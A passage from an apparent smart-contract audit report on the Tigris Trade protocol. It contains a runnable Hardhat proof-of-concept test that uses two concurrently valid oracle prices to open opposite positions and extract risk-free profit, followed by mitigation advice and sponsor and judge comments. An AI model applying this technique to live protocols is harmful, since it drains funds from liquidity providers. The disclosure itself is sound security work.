class=\"grvsc-source\">  let proxy;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let Trading;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let trading;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let TradingExtension;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let tradingExtension;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let TradingLibrary;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let tradinglibrary;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let StableToken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let stabletoken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let StableVault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let stablevault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let position;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let pairscontract;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let referrals;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let permitSig;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let permitSigUsdc;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let MockDAI;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let MockUSDC;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let mockusdc;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let badstablevault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let chainlink;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  beforeEach(async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await deployments.fixture([&#39;test&#39;]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    StableToken = await deployments.get(&quot;StableToken&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    stabletoken = await ethers.getContractAt(&quot;StableToken&quot;, StableToken.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Trading = await deployments.get(&quot;Trading&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    trading = await ethers.getContractAt(&quot;Trading&quot;, Trading.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TradingExtension = await deployments.get(&quot;TradingExtension&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tradingExtension = await ethers.getContractAt(&quot;TradingExtension&quot;, TradingExtension.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const Position = await deployments.get(&quot;Position&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    position = await ethers.getContractAt(&quot;Position&quot;, Position.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockDAI = await deployments.get(&quot;MockDAI&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockUSDC = await deployments.get(&quot;MockUSDC&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mockusdc = await ethers.getContractAt(&quot;MockERC20&quot;, MockUSDC.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const PairsContract = await deployments.get(&quot;PairsContract&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    pairscontract = await ethers.getContractAt(&quot;PairsContract&quot;, PairsContract.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const Referrals = await deployments.get(&quot;Referrals&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    referrals = await ethers.getContractAt(&quot;Referrals&quot;, Referrals.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    StableVault = await deployments.get(&quot;StableVault&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    stablevault = await ethers.getContractAt(&quot;StableVault&quot;, StableVault.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await stablevault.connect(owner).listToken(MockDAI.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await stablevault.connect(owner).listToken(MockUSDC.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(&quot;1&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setNode(node.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setNode(node2.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setNode(node3.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await network.provider.send(&quot;evm_setNextBlockTimestamp&quot;, [2000000000]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await network.provider.send(&quot;evm_mine&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const BadStableVault = await ethers.getContractFactory(&quot;BadStableVault&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    badstablevault = await BadStableVault.deploy(StableToken.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const ChainlinkContract = await ethers.getContractFactory(&quot;MockChainlinkFeed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    chainlink = await ChainlinkContract.deploy();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TradingLibrary = await deployments.get(&quot;TradingLibrary&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tradinglibrary = await ethers.getContractAt(&quot;TradingLibrary&quot;, TradingLibrary.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await trading.connect(owner).setLimitOrderPriceRange(1e10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  describe(&quot;Simulate long with low price and short with high price at the same tx to lock profit&quot;, function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let longId;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let shortId;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    beforeEach(async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let TradeInfo = [parseEther(&quot;1000&quot;), MockDAI.address, StableVault.address, parseEther(&quot;10&quot;), 1, true, parseEther(&quot;0&quot;), parseEther(&quot;0&quot;), ethers.constants.HashZero];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let PriceData = [node.address, 1, parseEther(&quot;1000&quot;), 0, 2000000000, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let message = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            [node.address, 1, parseEther(&quot;1000&quot;), 0, 2000000000, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let sig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          Buffer.from(message.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        longId = await position.getCount();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        expect(await position.assetOpenPositionsLength(1)).to.equal(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        TradeInfo = [parseEther(&quot;1010&quot;), MockDAI.address, StableVault.address, parseEther(&quot;10&quot;), 1, false, parseEther(&quot;0&quot;), parseEther(&quot;0&quot;), ethers.constants.HashZero];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        PriceData = [node.address, 1, parseEther(&quot;1010&quot;), 0, 2000000000, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        message = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            [node.address, 1, parseEther(&quot;1010&quot;), 0, 2000000000, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        sig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          Buffer.from(message.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        shortId = await position.getCount();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        expect(await position.assetOpenPositionsLength(1)).to.equal(2);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    it.only(&quot;Exit at any price to take profit&quot;, async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // same time later, now we can close the orders</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await network.provider.send(&quot;evm_setNextBlockTimestamp&quot;, [2000000100]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await network.provider.send(&quot;evm_mine&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // any new price, can be changed to other price such as 950, just ensure enough margin</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let closePrice = parseEther(&quot;1050&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let closeMessage = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            [node.address, 1, closePrice, 0, 2000000100, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let closeSig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          Buffer.from(closeMessage.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let balanceBefore = await stabletoken.balanceOf(owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await trading.connect(owner).initiateCloseOrder(longId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        await trading.connect(owner).initiateCloseOrder(shortId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let balanceAfter = await stabletoken.balanceOf(owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let principal = parseEther(&quot;1000&quot;).add(parseEther(&quot;1010&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        let profit = balanceAfter.sub(balanceBefore).sub(principal);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        expect(profit.gt(parseEther(`50`))).to.equal(true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    it.only(&quot;Exit with another price pair to double profit&quot;, async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // some time later, now we can close the orders</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await network.provider.send(&quot;evm_setNextBlockTimestamp&quot;, [2000000100]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await network.provider.send(&quot;evm_mine&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // any new price pair, can be changed to other price such as (950, 960), just ensure enough margin</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let closePrice = parseEther(&quot;1050&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let closeMessage = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [node.address, 1, closePrice, 0, 2000000100, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let closeSig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Buffer.from(closeMessage.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let balanceBefore = await stabletoken.balanceOf(owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // close long with high price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.connect(owner).initiateCloseOrder(longId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      closePrice = parseEther(&quot;1040&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      closePriceData = [node.address, 1, closePrice, 0, 2000000100, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      closeMessage = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [node.address, 1, closePrice, 0, 2000000100, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      closeSig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Buffer.from(closeMessage.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // close short with low price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.connect(owner).initiateCloseOrder(shortId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let balanceAfter = await stabletoken.balanceOf(owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let principal = parseEther(&quot;1000&quot;).add(parseEther(&quot;1010&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let profit = balanceAfter.sub(balanceBefore).sub(principal);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(profit.gt(parseEther(`100`))).to.equal(true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">});</span></span></code></pre>\n<p>How to run</p>\n<p>Put the test case to a new BypassDelayCheck.js file of test directory, and run:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"33\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">npx hardhat test</span></span></code></pre>\n<p>And the test result will be:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"34\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  Bypass delay check to earn risk free profit</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Simulate long with low price and short with high price at the same tx to lock profit</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      √ Exit at any price to take profit</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      √ Exit with another price pair to double profit</span></span></code></pre>\n<h3 id=\"tools-used-7\" style=\"position:relative;\"><a href=\"#tools-used-7\" aria-label=\"tools used 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VS Code, Hardhat</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Cache recent lowest and highest prices, open long order with the highest price and short order with the lowest price.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/108#issuecomment-1375828833\">TriHaz (Tigris Trade) disputed and  commented</a>:</strong></p>\n<blockquote>\n<p>We don’t think this is valid as price sig expires in a very small window that would prevent a big price difference that could work in the same transaction to long &#x26; short.</p>\n<p>Also we have spread and funding fees that would make this so hard to be profitable.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/108#issuecomment-1383763386\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The finding is effectively saying that while a delay exist, it doesn’t truly offer any security guarantees because a trader could just open a trade on both sides, by using 2 different prices that are active at the same time.</p>\n<p>Anytime the spread between the prices, magnified by leverage, is higher than the fees, the trade is profitable (an arbitrage) at the disadvantage of the LPers.</p>\n<p>I think we don’t have sufficient information to irrevocably mark this as a security vulnerability (just like there’s no guarantee of prices being active once at a time, there’s no guarantee there won’t be).</p>\n<p>For this reason, I believe the finding to be valid and of Medium Severity.</p>\n<p>The finding is worth investigating once the system is deployed as it’s reliant on settings and oracle behaviour</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/108#issuecomment-1406969496\">GainsGoblin (Tigris Trade) commented</a>:</strong></p>\n<blockquote>\n<p>Oracle behaviour can easily mitigate this issue by setting appropriate spreads based on price movement, however there is nothing to be done in the contracts.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-approved-operators-of-position-token-cant-call-tradinginitiatecloseorder\" style=\"position:relative;\"><a href=\"#m-04-approved-operators-of-position-token-cant-call-tradinginitiatecloseorder\" aria-label=\"m 04 approved operators of position token cant call tradinginitiatecloseorder permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/124\">[M-04] Approved operators of Position token can’t call Trading.initiateCloseOrder</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/124\">rvierdiiev</a>, also found by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/401\">__141345__</a> and <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/280\">UniversalCrypto</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235</a> </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849</a></p>\n<h3 id=\"impact-3\" style=\"position:relative;\"><a href=\"#impact-3\" aria-label=\"impact 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Approved operators of owner of Position token can’t call several function in Trading.</p>\n<h3 id=\"proof-of-concept-14\" style=\"position:relative;\"><a href=\"#proof-of-concept-14\" aria-label=\"proof of concept 14 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Functions that accept Position token in Trading are checking that the caller is owner of token using <code>\\_checkOwner</code> function. </p>\n<p><a href=\"https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849\">https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"soldiity\" data-index=\"35\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _checkOwner(uint _id, address _trader) internal view 